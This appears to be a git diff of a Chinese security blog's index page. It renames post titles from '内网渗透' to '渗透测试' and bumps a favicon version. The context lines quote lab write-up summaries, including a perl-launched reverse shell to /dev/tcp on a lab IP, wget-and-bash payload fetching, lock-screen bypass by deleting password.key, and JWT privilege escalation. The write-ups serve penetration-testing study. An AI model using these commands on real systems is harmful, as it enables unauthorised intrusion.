@@ -9,7 +9,7 @@
 <meta name="description" content="不问去留">
 <meta name="theme-color" content="#000">
 <title> n1book_android1 | DAMOXILAI</title>
-<link rel="shortcut icon" href="/favicon.ico?v=1629172235414">
+<link rel="shortcut icon" href="/favicon.ico?v=1629179093396">
 <link rel="stylesheet" href="/media/css/gemini.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
 <link
@@ -1801,7 +1801,7 @@ rm -rf password.key
 &lt;img src=&#34;https://damoxilai.github.io/post-images/1629171910165.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;三-实验总结&#34;&gt;三、实验总结&lt;/h2&gt;
 &lt;p&gt;实验诱导从网站后门进，实际是假后门，灵活变通很重要，想到有其他端口开放adb服务，不要一颗树上吊死；android的adb连接是基本操作，su就可提升为root；绕过改界面密码在/data/system/password.key文件处。&lt;/p&gt;
-">内网渗透之Android4</a>
+">渗透测试之Android4</a>
       </div>
       
       <div class="item">
@@ -2165,7 +2165,7 @@ echo &amp;quot;$out&amp;quot;;
 &lt;p&gt;(5)hydra爆破，终端用ftp登录（ftp 192.168.0.102），ftp传文件用put ./1.txt&lt;/p&gt;
 &lt;p&gt;(6)perl语言可调用system执行系统命令，可直接反弹shell（system(&amp;quot;bash -c &#39;/bin/sh -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.150/1234 0&amp;gt;&amp;amp;1&#39;&amp;quot;);）&lt;/p&gt;
 &lt;p&gt;(7)不同的所有者的shell因权限会受各种限制，www-data所能做的是有限才需要转为le用户，必须对文件所有者、文件执行权限、setuid标志有清楚认识，setuid标志位是成功提权的关键&lt;/p&gt;
-">内网渗透之Casino-Royale</a>
+">渗透测试之Casino-Royale</a>
       </div>
       
       <div class="item">
@@ -2293,7 +2293,7 @@ router.post(&#39;/linkauthenticate&#39;, (req, res, next) =&amp;gt; {
 &lt;p&gt;(2)token中jwt解密，更改权限，实现垂直越权漏洞&lt;/p&gt;
 &lt;p&gt;(3)Bulldog-2-The-Reckoning存在密码处命令执行漏洞，实现反弹shell&lt;/p&gt;
 &lt;p&gt;(4)passwd有写权限，可依照root新建一个root权限的用户&lt;/p&gt;
-">内网渗透之bulldog2</a>
+">渗透测试之bulldog2</a>
       </div>
       
       <div class="item">
@@ -2425,7 +2425,7 @@ web指纹扫描用于识别目标所运行的web软件、后端服务器、编�
 &lt;p&gt;(4)搭建web服务（python -m SimpleHTTPServer 80）；wget下载shell，bash执行，获取反弹shell&lt;/p&gt;
 &lt;p&gt;(5)/etc/passwd找寻系统id1000以后的用户，查看其文件，找到隐藏文件，发现隐藏密码&lt;/p&gt;
 &lt;p&gt;(6)python调用本地的shell，打开一个新的终端（sudo python -c &#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;）&lt;/p&gt;
-">内网渗透之bulldog</a>
+">渗透测试之bulldog</a>
       </div>
       
       <div class="item">
